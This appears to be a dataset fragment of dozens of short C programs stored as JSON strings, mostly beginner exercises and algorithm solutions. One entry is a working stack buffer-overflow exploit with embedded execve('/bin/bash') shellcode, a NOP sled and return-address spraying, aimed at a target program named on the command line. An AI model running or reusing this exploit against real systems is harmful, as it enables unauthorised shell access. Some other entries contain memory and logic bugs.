    "#include <ctype.h>\n#include <stdio.h>\ntypedef unsigned char BYTE;\nint main() {\n    unsigned int addr;\n    int i, n;\n    BYTE *ptr;\n    printf(\"Address of main function: %x\\n\", (unsigned int)main);\n    printf(\"Address of addr variable: %x\\n\", (unsigned int)&addr);\n    printf(\"\\nEnter a (hex) address: \");\n    scanf(\"%x\", &addr);\n    printf(\"Enter number of bytes to view: \");\n    scanf(\"%d\", &n);\n    printf(\"\\n\");\n    printf(\" Address              Bytes              Characters\\n\");\n    printf(\" -------  -----------------------------  ----------\\n\");\n    ptr = (BYTE *)addr;\n    for (; n > 0; n -= 10) {\n        printf(\"%8X  \", (unsigned int)ptr);\n        for (i = 0; i < 10 && i < n; i++)\n            printf(\"%.2X \", *(ptr + i));\n        for (; i < 10; i++)\n            printf(\"   \");\n        printf(\" \");\n        for (i = 0; i < 10 && i < n; i++) {\n            BYTE ch = *(ptr + i);\n            if (!(0 ? isprint(ch) : ((unsigned)(ch)-0x20) < 0x5f))\n                ch = '.';\n            printf(\"%c\", ch);\n        }\n        printf(\"\\n\");\n        ptr += 10;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    char *dest = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n    char szMd5[33] = {0};\n    for (short i = 0; i < 16; i++)\n    {\n        if(i==0){\n             sprintf(szMd5, \"%s%02x\", szMd5, 'a');\n        }else{\n            sprintf(szMd5, \"%s%02x\", szMd5, dest[i-1]);\n        }\n    }\n    for (short i = 0; i < 32; i++)\n    {\n        printf(\"%c\\n\",szMd5[i]);\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n    int e_sair;\n    while(1){\n    printf(\"Tecle 0 para sair:\");\n    scanf(\"%i\", &e_sair);\n    if(e_sair==0){\n        break;\n    }\n    }\n    printf(\"Fim\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int i, j, valor=1, quadrado[5][5];\n for(i=0;i<5;i++){\n  for(j=0;j<5;j++){\n       quadrado[i][j] = 0;\n  }\n }\n for(i=0;i<5;i++){\n  for(j=0;j<5;j++){\n   if(i == j)\n        quadrado[i][j] = 1;\n  }\n }\n printf(\"A matriz identidade\\n\");\n for (i=0; i<4;i++){\n  for (j=0;j<4;j++){\n   printf(\"\\t%d\", quadrado[i][j]);\n  }\n  printf(\"\\n\");\n }\n}",
    "#include <stdio.h>\nint main()\n{\n int n1,n2;\n puts(\"Introduzca el primer numero: \");\n scanf(\"%d\",&n1);\n puts(\"Introduzca el segundo numero: \");\n scanf(\"%d\",&n2);\n if(n1 == n2){\n  printf(\"\\t%d y %d son iguales\\n\", n1,n2);\n }else if(n1 < n2){\n  printf(\"\\t%d es mayor que %d\", n2,n1);\n }else{\n  printf(\"\\t%d es mayor que %d\", n1,n2);\n }\n return 0;\n}",
    "#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\nvoid exit_sys(const char* msg);\nint main(void)\n{\n    int fd;\n    char buf[4096 + 1];\n    int len;\n    ssize_t result;\n    if ((fd = open(\"./pipe_driver\", (0x04000000))) == -1)\n        exit_sys(\"open\");\n    for (;;) {\n        printf(\"How many bytes to read? \");\n        fflush((stdout));\n        scanf(\"%d\", &len);\n        if (!len)\n            break;\n        if ((result = read(fd, buf, len)) == -1)\n            exit_sys(\"read\");\n        buf[result] = '\\0';\n        printf(\"%ld bytes read: \\\"%s\\\"\\n\", (long)result, buf);\n    }\n    close(fd);\n    return 0;\n}\nvoid exit_sys(const char* msg)\n{\n    perror(msg);\n    exit(1);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n int i,quant_Termos, Sinal;\n float numerador,denominador,s;\n printf(\"informe quantidade de termos\");\n scanf(\"%d\",&quant_Termos);\n numerador =1;\n denominador =2;\n Sinal = 1;\n s =0;\n for(i=1;i<=quant_Termos;i++){\n  s = s + ((numerador/denominador)*(Sinal));\n  Sinal = Sinal *(-1);\n  numerador+=1;\n  denominador+=1;\n }\n    printf(\"s = %f\",s);\n return 0;\n}",
    "#include <stdio.h>\nint main () {\n int x,y,v;\n scanf (\"%d %d\", &x,&y);\n v=x+y;\n printf (\"%d\\n\", v);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar *catArgs(int argc, char *argv[])\n{\n size_t length = 0;\n int i; for (i=1; i<argc; i++) {\n  length += strlen(argv[i]);\n  if (i < argc - 1) length++;\n }\n char *buf = malloc(length + 1);\n *buf = '\\0';\n for (i=1; i<argc; i++) {\n  strcat(buf, argv[i]);\n  if (i < argc - 1) strcat(buf, \" \");\n }\n return buf;\n}\nint main(int argc, char *argv[])\n{\n char *ptr, *buf;\n unsigned int runlength = 0;\n if (argc < 2) {\n  printf(\"Usage: %s string\\n\", argv[0]);\n  return 1;\n }\n ptr = buf = catArgs(argc, argv);\n while (*ptr != '\\0') {\n  static char last;\n  if (ptr == buf)\n last = *ptr;\n  if (*ptr == last) runlength ++;\n  else {\n   printf(\"%u\\tx '%c'\\n\", runlength, last);\n   runlength = 1;\n   last = *ptr;\n  }\n  ptr++;\n }\n printf(\"%u\\tx '%c'\\n\", runlength, *(ptr-1));\n free(buf);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    long long int t,i,p,r,a,b,c;\n    float q;\n    scanf(\"%lld\",&t);\n    for(i=1;i<=t;i++)\n    {\n        a=b=c=0;\n        scanf(\"%lld%f%lld\",&p,&q,&r);\n        if(p>50)\n            a=1;\n        if(q<0.7)\n            b=1;\n        if(r>5600)\n            c=1;\n        if(a&&b&&c)\n        {\n            printf(\"10\\n\");\n            continue;\n        }\n        if(a&&b)\n        {\n            printf(\"9\\n\");\n            continue;\n        }\n        if(b&&c)\n        {\n            printf(\"8\\n\");\n            continue;\n        }\n        if(a&&c)\n        {\n            printf(\"7\\n\");\n            continue;\n        }\n        if(a||b||c)\n        {\n            printf(\"6\\n\");\n            continue;\n        }\n        printf(\"5\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <memory.h>\nint main(int argc, char *argv[]) {\n char *string1 = argv[1];\n char *string2 = argv[2];\n int res=0, i=0, trigger=0;\n printf(\"String 1: %s\\n\", string1);\n printf(\"String 2: %s\\n\", string2);\n int str1length = 0;\n int str2length = 0;\n str1length = strlen(string1);\n str2length = strlen(string2);\n if(str1length > str2length)\n {\n  printf(\"Our result: The strings are different!\\n\");\n }\n else if(str1length < str2length)\n {\n  printf(\"Our result: The strings are different!\\n\");\n }\n else\n {\n  while(string1[i] != '\\0')\n  {\n   if((string1[i] != string2[i]) && trigger == 0){\n    trigger = 1;\n   }\n   i++;\n  }\n  if(trigger == 1)\n  {\n   printf(\"Our result: The strings are different!\\n\");\n  }\n  else\n  {\n   printf(\"Our result: The strings are identical!\\n\");\n  }\n }\n res = strcmp(string1, string2);\n if(res == 0)\n {\n  printf(\"strcmp result: The strings are identical!\\n\");\n }\n else\n {\n  printf(\"strcmp result: The strings are different!\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\n\n\n\nint main(){\n    int area1 ;\n    area1 = 10 * 5;\n    printf(\"value of area1 : %d\",area1);\n    printf(\"%c\",'\\n');\n    const int LENGTH2 = 10;\n    const int WIDTH2 = 10;\n    int area2 ;\n    area2 = LENGTH2 * WIDTH2;\n    printf(\"value of area2 : %d\",area2);\n    printf(\"%c\",'\\n');\n    return 0 ;\n}",
    "#include <math.h>\n#include <stdio.h>\nint calc_fanset(float setpoint, float sensor_max) {\n  float setpoint_percent = setpoint / sensor_max;\n  return (int)floor(setpoint_percent * 255);\n}\nint main(void) {\n  float temperature_setpoint = 40;\n  float sensor_max = 100;\n  printf(\"Full-speed temperature: %.0f\u00b0C\\n\", temperature_setpoint);\n  printf(\"Fan setpoint: %d\\n\", calc_fanset(temperature_setpoint, sensor_max));\n  return 0;\n}",
    "int ga;\nint func( int a ) {\n  ga = 1;\n}\nint main( void ) {\n  int a;\n  int b;\n  func(0x44);\n  a = func(0x44);\n  a = 1 + func(2+0x44);\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n    int p;\n    while((p=getchar())!=(-1)){putchar(p);}\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"UtilityOK\\n\");\n    return 0;\n}",
    "#include<stdio.h>\ntypedef long long int ll;\nint gcd(int a, int b)\n{if (b == 0) return a;\nreturn gcd(b, a % b);}\nll lcm(int arr[], int n)\n{\n    ll ans = arr[0],i;\n    for (i = 1; i < n; i++) ans = (((arr[i] * ans)) /(gcd(arr[i], ans)));\n    return ans;\n}\nint main()\n{\n    int a[100000],n,i;\n    scanf(\"%lld\",&n);\n    for(i=0;i<n;i++) scanf(\"%lld\",&a[i]);\n    printf(\"%lld\", lcm(a,n));\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n  int n;\n  while (scanf(\"%d\", &n) && n != 0)\n  {\n    float x[n], y[n]; int ler;\n    float a, b, R, somaXY = 0, somaX = 0, somaY = 0, somaX2 = 0, somaY2 = 0;\n    for (ler = 0; ler < n; ler ++)\n    {\n      scanf(\"%f %f\", &x[ler], &y[ler]);\n      somaX += x[ler]; somaX2 += pow(x[ler],2);\n      somaY += y[ler]; somaY2 += pow(y[ler],2);\n      somaXY += (x[ler] * y[ler]);\n    }\n    a = ((n * somaXY) - (somaX * somaY)) / ((n * somaX2) - pow(somaX,2));\n    b = ((somaY * somaX2) - (somaX * somaXY)) / ((n * somaX2) - pow(somaX,2));\n    R = ((n * somaXY) - (somaX * somaY)) / (sqrt((n * somaX2) - pow(somaX,2)) * sqrt((n * somaY2) - pow(somaY,2)));\n    printf(\"a = %.2f, b = %.2f, R = %.2f\\n\", a, b, R);\n  }\n  return(0);\n}",
    "#include <stdio.h>\nint main(void){\n void concat(char result[], const char str1[], const char str2[]);\n const char s1[] = {\"Test \"};\n const char s2[] = {\"works.\"};\n char s3[20];\n concat(s3, s1, s2);\n printf(\"%s\\n\", s3);\n return 0;\n}\nvoid concat(char result[], const char str1[], const char str2[]){\n int i, j;\n for(i = 0; str1[i] != '\\0'; ++i)\n  result[i] = str1[i];\n for(j = 0; str2[j] != '\\0'; ++j)\n  result[i + j] = str2[j];\n result[i + j] = '\\0';\n}",
    "#include <stdio.h>\n\n\nint main()\n{\n int A[4][4] = {{0, 5, 9, 999},\n     {999, 0, 1, 999},\n     {999, 999, 0, 2},\n     {999, 3, 999, 0}};\n int i, j, k;\n for (k = 0; k < 4; k++)\n {\n  for (i = 0; i < 4; i++)\n  {\n   for (j = 0; j < 4; j++)\n   {\n    if (A[i][k] + A[k][j] < A[i][j])\n     A[i][j] = A[i][k] + A[k][j];\n   }\n     }\n }\n printf(\"\\n The shortest distances from every pair of vertices are:\\n\");\n for (i = 0; i < 4; i++)\n {\n  for (j = 0; j < 4; j++)\n  {\n   if (A[i][j] == 999)\n    printf(\"%s\\t\", \"INF\");\n   else\n    printf(\"%d\\t\", A[i][j]);\n  }\n  printf(\"\\n\");\n }\n}",
    "#include <stdio.h>\nint main(){\n printf(\"Hello, world\\a\");\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(void)\n{\n    const char* str = \"hello world, friend of mine!\";\n    const char* sep = \" ,!\";\n    unsigned int cnt = 0;\n    do {\n       str = strpbrk(str, sep);\n       if(str) str += strspn(str, sep);\n       ++cnt;\n    } while(str && *str);\n    printf(\"There are %u words\\n\", cnt);\n}",
    "#include <unistd.h>\nint foo() {\n return 0;\n}\nint main() {\n for(ssize_t i = 10000000; i > 0; i--)\n  foo();\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n#include<ctype.h>\nFILE *fint,*ftab,*flen,*fsym,*fout,*ftemp;\nint op1[10],txtlen,txtlen1,i,j=0,len,wordcount;\nchar add[5],symadd[5],op[5],start[10],temp[30],line[20],label[20],mne[10],operand[10],symtab[10],opmne[10];\nvoid threeword(){\nfscanf(fint,\"%s%s%s%s\",add,label,mne,operand);\nif((strcmp(mne,\"BYTE\")==0)||(strcmp(mne,\"WORD\")==0))\n{\nif(strcmp(mne,\"WORD\")==0)\nfprintf(fout,\"0000%s^\",operand);\nelse\n{\nlen=strlen(operand);\nfor(i=2;i<len;i++)\n{\nfprintf(fout,\"%d\",operand[i]);\n}\nfprintf(fout,\"^\");\n}\n}\n}\nvoid twoword(){\nfscanf(fint,\"%s%s%s\",add,mne,operand);\nftab=fopen(\"optab.txt\",\"r\");\nfseek(ftab,(0),0);\nfsym=fopen(\"symtab.txt\",\"r\");\nfseek(fsym,(0),0);\nif(strcmp(mne,\"END\")!=0)\n{\nfscanf(ftab,\"%s%s\",opmne,op);\nwhile(!feof(ftab))\n{\nif(strcmp(mne,opmne)==0)\n{\nfclose(ftab);\nfscanf(fsym,\"%s%s\",symadd,symtab);\nwhile(!feof(fsym))\n{\nif(strcmp(operand,symtab)==0)\n{\nfprintf(fout,\"%s%s^\",op,symadd);\nfclose(fsym);\nbreak;\n}\nelse\nfscanf(fsym,\"%s%s\",symadd,symtab);\n}\nbreak;\n}\nelse\nfscanf(ftab,\"%s%s\",opmne,op);\n}\n}\nelse\nfprintf(fout,\"\\nE^00%s\",start);\n}\nint main()\n{\nchar ch;\nfint=fopen(\"input2.txt\",\"r\");\nflen=fopen(\"length.txt\",\"r\");\nfout=fopen(\"machinecode.txt\",\"w\");\nftemp=fopen(\"input2.txt\",\"r\");\nfscanf(fint,\"%s%s%s\",label,mne,operand);\nif(strcmp(mne,\"START\")==0)\n{\nstrcpy(start,operand);\nfscanf(flen,\"%d\",&len);\n}\nfprintf(fout,\"H^%s^%s^%d\\nT^00%s^\",label,start,len,start);\nfgets(temp,25,ftemp);\nwhile(!feof(fint)){\n    wordcount=0;\n    fseek(ftemp,7,(1));\n   ch=getc(ftemp);\n    if(ch=='\\t')\n    wordcount=2;\n    else\n    wordcount=3;\n    fgets(temp,25,ftemp);\n    switch(wordcount){\n        case 3:threeword();\n        break;\n        case 2:twoword();\n        break;\n        default:\n        break;\n    }\n}\nfclose(fint);\nfclose(ftab);\nfclose(fsym);\nfclose(flen);\nfclose(fout);\nreturn 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n fprintf((stderr), \"#%d!\\n\", 1234);\n return 0;\n}",
    "#include<stdio.h>\nint gcd(int a,int b)\n{\n {\n  if(a%b==0)\n      return b;\n  else\n      gcd(b,a%b);\n }\n}\nint main()\n{\n int a,b;\n printf(\"Enter 2 integers:\\n\");\n scanf(\"%d%d\",&a,&b);\n printf(\"GCD of %d and %d = %d\\n\",a,b,gcd(a,b));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\nint main(void) {\n int list[10] = {12 ,-5 ,0 ,8 ,5 ,8 ,3 ,-4 ,-1 ,20};\n int item = 0;\n int i = 0;\n _Bool found = 0;\n printf(\"Enter the number you are looking for: \");\n scanf(\"%d\", &item);\n while(!found && i < 10)\n {\n  if (item == list[i])\n  {\n   found = 1;\n  }\n  else\n  {\n   i++;\n  }\n }\n if (!found)\n {\n         printf(\"The number %d is not found the list. \\n\", item);\n }\n else\n {\n         printf(\"The number %d is found at index %d in the list. \\n\", item, i);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    unsigned long long int a, b;\n    int n, x, count;\n    scanf(\"%d\", &n);\n    while(n-->0){\n        scanf(\" %llu %llu\", &a, &b);\n        x=b;\n        count=0;\n        while(x>0)\n        {\n            count++;\n            x=x/10;\n        }\n        if(a%(int)(pow(10, count))==b) printf(\"encaixa\\n\");\n        else printf(\"nao encaixa\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <errno.h>\n#include <stdlib.h>\n\nint main(void) {\n FILE *fdWrite, *fdRead;\n int n;\n char buf[16384];\n if( (fdWrite = fopen(\"bar\", \"w\")) == ((void*)0)) {\n  printf(\"open error with errno = %d\\n\", errno);\n  perror(\"bar\");\n  exit(1);\n }\n if( (fdRead = fopen(\"foo\", \"r\")) == ((void*)0)) {\n  printf(\"open error with errno = %d\\n\", errno);\n  perror(\"foo\");\n  exit(1);\n }\n while( (n=fread(buf, 1, 16384, fdRead)) > 0) {\n  if( (n = fwrite(buf, 1, n, fdWrite)) == 0) {\n   if(ferror(fdWrite)) {\n    printf(\"bar write error with errno = %d\\n\", ferror(fdWrite));\n    exit(1);\n   }\n  }\n }\n return 0;\n}",
    "#include<stdio.h>\nint exponenciacao(int base, int expoente){\n int i;\n int result = base;\n for(i=0; i<expoente-1; i++)\n  result *= base;\n return result;\n}\nint main(){\n printf(\"%d\\n\", exponenciacao(5, 3));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nunsigned long sum_of_divisors(unsigned int N)\n{\n    unsigned long sum = 1 + N; \n    for (unsigned int i = 2; i * i < N; i++)\n    {\n        if ((N % i) != 0)\n            continue;\n        sum += i + (N / i);\n    }\n    return sum;\n}\nint main(int argc, char **argv)\n{\n    unsigned long sum = 0;\n    unsigned int MAX_N = 500;\n    if (argc == 2)\n        MAX_N = atoi(argv[1]);\n    char *flags = (char *)calloc(MAX_N, sizeof(char));\n    clock_t start_time = clock();\n    int i;\n    for (i = 10; i < MAX_N; i++)\n    {\n        if (flags[i] != 0)\n            continue;\n        unsigned int b = sum_of_divisors(i);\n        if (b >= MAX_N)\n            flags[i] = -1;\n        else if (flags[b] == -1)\n            continue;\n        unsigned int c = sum_of_divisors(b);\n        if (c == i && b != i)\n        {\n            flags[b] = 1;\n            flags[i] = 1;\n            sum += b + i;\n#ifdef DEBUG\n            printf(\"Amicable: %4d : %4d\\n\", i, b);\n#endif\n        }\n        else\n        {\n            flags[i] = -1;\n            if (b < MAX_N)\n                flags[b] = -1;\n        }\n    }\n    clock_t end_time = clock();\n    printf(\"\\nTime taken: %.4g millisecond\\n\",\n           1e3 * (end_time - start_time) / CLOCKS_PER_SEC);\n    printf(\"Sum of all numbers = %lu\\n\", sum);\n    free(flags);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    char s[512];\n    int count[2500];\n    int t;\n    fgets(s, sizeof(s)-1, (stdin));\n    sscanf(s, \"%d\", &t);\n    for(int i = 0; i < t; i++) {\n        int n;\n        scanf(\"%d\", &n);\n        for(int j = 0; j < 2500; j++) {\n            count[j] = 0;\n        }\n        int x;\n        for(int j = 0; j < ((2*n-1)*n); j++) {\n            scanf(\"%d\", &x);\n            count[x-1]++;\n        }\n        printf(\"Case #%d: \", i+1);\n        int j = 0;\n        int k = 0;\n        for(j = 0; j < sizeof(count); j++) {\n            if(count[j]%2 != 0) {\n                printf(\"%d \", j+1);\n                k++;\n            }\n            if(k == n) {\n                break;\n            }\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nchar c;\nint main() {\n    do {\n        c = fgetc((stdin));\n        if (feof((stdin))) {\n            break;\n        }\n        if ((c >= 'a') && (c <= 'z')) {\n            c -= 32;\n        }\n        printf(\"%c\", c);\n    } while (1);\n    return 0;\n}",
    "#include<stdio.h>\n#include<sys/types.h>\n#include<unistd.h>\nint ct,pt;\nint main(int argc, char** argv){\n pid_t pid;\n switch(argv[1][0]){\n case '0':\n  printf(\"\\n\u666e\u901a\u60c5\u51b5\uff1a\\n\");\n  ct=pt=5;\n  break;\n case '1':\n  printf(\"\\n\u7236\u8fdb\u7a0b\u5148\u7ed3\u675f\uff1a\\n\");\n  pt=2,ct=8;\n  break;\n case '2':\n  printf(\"\\n\u5b50\u8fdb\u7a0b\u5148\u7ed3\u675f\uff1a\\n\");\n  pt=8,ct=2;\n  break;\n }\n pid=fork();\n if(pid==0) {\n  sleep(ct);\n  printf(\"\\nChild Process: pid:%d ppid:%d\\n\",\n   getpid(),getppid());\n }\n else if(pid>0) {\n  sleep(pt);\n  printf(\"\\nParent Process: pid:%d ppid:%d\\n\",\n   getpid(),getppid());\n }\n return 0;\n}",
    "int main() {\n  int a = 1, c = 0, d = 0;\n  switch (a) {\n    case 1:\n      c++;\n      break;\n    default:\n      d++;\n      break;\n  }\n  switch (a) {\n    default:\n      d++;\n      break;\n    case 1:\n      c++;\n      break;\n  }\n  switch (a) {\n    case 1:\n      c++;\n      break;\n  }\n  switch (a) {\n    default:\n      d++;\n      break;\n  }\n  switch (a) {\n    case 1:\n      c++;\n    default:\n      d++;\n  }\n  switch (a) {\n    default:\n      d++;\n    case 1:\n      c++;\n  }\n  goto L;\n  switch (a) {\n    case 1:\n      c++;\n      break;\n    L:\n    default:\n      d++;\n  }\n  if (c == 5 && d == 3) {\nERROR:\n    return 1;\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    int x;\n    float g;\n    scanf(\"%d\", &x);\n    g = log((float)x)/log(2.0);\n    printf(\"g = %f\\n\", g);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,number,arr[100],j,insert,input,count=0, temp,temp_2;\n    printf(\"Input the number of elements to be stored in the array : \");\n    scanf(\"%d\",&number);\n    printf(\"\\nInput %d elements in the array : \",(number-1));\n    for(i=0; i<number-1; i++)\n    {\n        printf(\"\\nelement - %d : \",i);\n        scanf(\"%d\",&arr[i]);\n    }\n    printf(\"\\nInput the position where to insert : \");\n    scanf(\"%d\",&insert);\n    printf(\"\\nInput the number to insert : \");\n    scanf(\"%d\",&input);\n    for(i=0; i<number; i++)\n    {\n        if((i-1)==insert)\n        {\n            temp = arr[i];\n            arr[i] = input;\n            count++;\n        }\n        else if(count>0)\n        {\n            temp_2 = arr[i];\n            arr[i] = temp;\n            temp = temp_2;\n        }\n    }\n    printf(\"\\nThe new list is : \");\n    for(i=0; i<number; i++)\n    {\n        printf(\"%d \",arr[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int num1, num2, num3;\n    printf(\"Enter 1st number : \");\n    scanf(\"%d\", &num1);\n    printf(\"\\nEnter 2nd number : \");\n    scanf(\"%d\", &num2);\n    printf(\"\\nEnter 3rd number : \");\n    scanf(\"%d\", &num3);\n    if(num1 >= num2) {\n        if(num1 >= num3) {\n            printf(\"\\n%d is largest number\", num1);\n        } else {\n            printf(\"\\n%d is largest number\", num3);\n        }\n    } else {\n        if(num2 >= num3) {\n            printf(\"\\n%d is largest number\", num2);\n        } else {\n            printf(\"\\n%d is largest number\", num3);\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void){\n    int count = 5;\n    int x;\n    int y;\n    const int n = 5;\n    int * const p_number = &x;\n    *p_number = 7;\n    int x1 = 5;\n    int y1;\n    const int * const ptr = &x1;\n    int *p_count;\n    p_count = &count;\n    printf(\"count %d\\n\", count);\n    printf(\" p_count %d\\n\", *p_count);\n    printf(\"La direcci\u00f3n de count es %p\\n\", &count);\n    printf(\"La direccion de p_count es %p\\n\", &p_count);\n    printf(\"La direccion almacenada en p_count es %p\\n\", p_count);\n    printf(\"ejemplos de * y & %p\\n\", &*p_count);\n    printf(\"ejemplos de * y & %p\\n\", *&p_count);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nchar shellcode[] = \"\\xeb\\x0b\\x5f\\x48\\x31\\xd2\\x52\\x5e\\x6a\\x3b\\x58\\x0f\\x05\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x2f\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x2f\\x62\\x61\\x73\\x68\";\nvoid fail(char *msg)\n{\n    char message_error[100];\n    strcpy(message_error, \"[ERROR]\\t!!!Failed erro \");\n    strncat(message_error, msg, 40);\n    perror(message_error);\n    exit(1);\n}\nvoid usage(char *prg)\n{\n    printf(\"[INFO]\\tusage =>\\n\\t$%s <app to exploit> <offset default:270>\\n\", prg);\n    exit(1);\n}\nint main(int argc, char **argv)\n{\n    unsigned int position_now;\n    int offset;\n    char *commande;\n    unsigned long long return_adresse;\n    int lenght;\n    if(argc < 2)\n        usage(argv[0]);\n    lenght = strlen(argv[1]) + strlen(\"\\'\");\n    commande = malloc(sizeof(char) * (lenght + 200) );\n    if(commande == ((void*)0))\n        fail(\"malloc error\");\n    bzero(commande, lenght + 200);\n    if(argc >= 3)\n        offset = atoi(argv[2]);\n    else\n        offset = 270;\n    strcpy(commande, argv[1]);\n    strcat(commande, \"\\'\");\n    return_adresse = (unsigned long long )(&position_now - offset);\n    int i;\n    char *buffer;\n    i = 0;\n    buffer = commande + lenght;\n    while(i < 200)\n    {\n        *((unsigned long long *)(buffer + i)) = return_adresse;\n        i += 8;\n    }\n    memset(buffer, 0x90, 60);\n    memcpy(buffer+60, shellcode, sizeof(shellcode) -1 );\n    strcat(commande, \"\\'\");\n    system(commande);\n    free(commande);\n    return 0;\n}",
    "#include<stdlib.h>\nint main()\n{\n  int *pi;\n  short *ps ;\n  pi = (int*)malloc(4*sizeof(int));\n  pi = pi+2;\n  ps = (short*)pi;\n  ps -= 4;\n  free(ps);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nunsigned int uiMin(unsigned int uiA, unsigned int uib, unsigned int uiC) {\n    if (uiA < uib && uiA < uiC) {\n        return uiA;\n    }\n    if (uib < uiA && uib < uiC) {\n        return uib;\n    }\n    return uiC;\n}\nvoid editDistance(char * szA, unsigned int uiLenA, char * szB, unsigned int uiLenB, unsigned int ** prgpuiDistance) {\n    unsigned int uiI;\n    for (uiI = 0; uiI <= uiLenA; uiI++) {\n        prgpuiDistance[uiI][0] = uiI;\n    }\n    unsigned int uiJ;\n    for (uiJ = 0; uiJ <= uiLenB; uiJ++) {\n        prgpuiDistance[0][uiJ] = uiJ;\n    }\n    unsigned int uiInsertion;\n    unsigned int uiDeletion;\n    unsigned int uiMatch;\n    unsigned int uiMismatch;\n    for (uiJ = 1; uiJ <= uiLenB; uiJ++) {\n        for (uiI = 1; uiI <= uiLenA; uiI++) {\n            uiInsertion = prgpuiDistance[uiI][uiJ - 1] + 1;\n            uiDeletion = prgpuiDistance[uiI - 1][uiJ] + 1;\n            uiMatch = prgpuiDistance[uiI - 1][uiJ - 1];\n            uiMismatch = prgpuiDistance[uiI - 1][uiJ - 1] + 1;\n            prgpuiDistance[uiI][uiJ] = (szA[uiI] == szB[uiJ]) ? uiMin(uiInsertion, uiDeletion, uiMatch) : uiMin(uiInsertion, uiDeletion, uiMismatch);\n        }\n    }\n    printf(\"%u\", prgpuiDistance[uiLenA][uiLenB]);\n}\nvoid strShift(char * sz, unsigned int uiLen) {\n    unsigned int uiIdx;\n    char c0 = 0;\n    char c1 = 0;\n    for (uiIdx = 0; uiIdx <= uiLen + 1 && uiIdx <= 100; uiIdx++) {\n        c0 = sz[uiIdx];\n        sz[uiIdx] = c1;\n        c1 = c0;\n    }\n}\nunsigned int uiStrLen(char * sz) {\n    unsigned int uiIdx;\n    for (uiIdx = 0; uiIdx <= 100 && sz[uiIdx] != '\\0'; uiIdx++) {\n        ;\n    }\n    return uiIdx;\n}\nint main(int argc, char const * argv[]) {\n    char szA[100 + 2];\n    scanf(\"%s\", szA);\n    char szB[100 + 2];\n    scanf(\"%s\", szB);\n    unsigned int uiLenA = uiStrLen(szA);\n    unsigned int uiLenB = uiStrLen(szB);\n    strShift(szA, uiLenA);\n    strShift(szB, uiLenB);\n    unsigned int ** prgpuiDistance = (unsigned int **) malloc((uiLenA + 1) * sizeof (unsigned int *));\n    unsigned int uiIdx;\n    for (uiIdx = 0; uiIdx <= uiLenA; uiIdx++) {\n        prgpuiDistance[uiIdx] = (unsigned int *) malloc((uiLenB + 1) * sizeof (unsigned int));\n    }\n    editDistance(szA, uiLenA, szB, uiLenB, prgpuiDistance);\n    for (uiIdx = 0; uiIdx <= uiLenA; uiIdx++) {\n        free(prgpuiDistance[uiIdx]);\n    }\n    free(prgpuiDistance);\n    return 0;\n}",
    "#include <stdio.h>\nlong long fib(int n) {\n    if (n <= 1) return 1;\n    printf(\"Computing fib %d\", n);\n    return fib(n - 1) + fib(n - 2);\n}\nint main() {\n    printf(\"At beginning of main\\n\");\n    printf(\"%lld\\n\", fib(11));\n    printf(\"At end of main\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n    int date, y, m, d;\n    printf(\"Enter date :\\n\");\n    scanf(\"%d\", &date);\n    y = date / 10000;\n    m = (date / 100) % 100;\n    d = date % 100;\n    switch (m)\n    {\n    case 1:\n        printf(\"January\");\n        break;\n    case 2:\n        printf(\"February\");\n        break;\n    case 3:\n        printf(\"March\");\n        break;\n    case 4:\n        printf(\"April\");\n        break;\n    case 5:\n        printf(\"May\");\n        break;\n    case 6:\n        printf(\"June\");\n        break;\n    case 7:\n        printf(\"July\");\n        break;\n    case 8:\n        printf(\"August\");\n        break;\n    case 9:\n        printf(\"September\");\n        break;\n    case 10:\n        printf(\"October\");\n        break;\n    case 11:\n        printf(\"November\");\n        break;\n    case 12:\n        printf(\"December\");\n        break;\n    default:\n        printf(\"Invalid.\\n\");\n        break;\n    }\n    printf(\" %d, %d\", d, y);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int a,b,c,s100,s50,s20;\n    scanf(\"%d\",&a);\n    s100=a/3600;\n    b=a%3600;\n    s50=b/60;\n    c=b%60;\n    printf(\"%d:%d:%d\\n\",s100,s50,c);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(){\n  while(1);\n return 0;\n}",
